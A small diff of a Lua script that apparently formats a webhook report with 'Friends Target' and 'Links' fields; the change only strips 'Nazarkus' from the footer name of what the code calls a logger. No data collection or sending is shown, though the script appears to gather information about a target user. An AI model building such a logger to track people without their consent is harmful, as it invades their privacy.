@@ -390,7 +390,7 @@ pcall(function()
                         {["name"] = "Friends Target", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
                         {["name"] = "Links", ["value"] = linksStr, ["inline"] = false}
                     },
-                    ["footer"] = { ["text"] = "Nazarkus Logger | " .. string.upper(status) },
+                    ["footer"] = { ["text"] = "Logger | " .. string.upper(status) },
                     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }}
             })
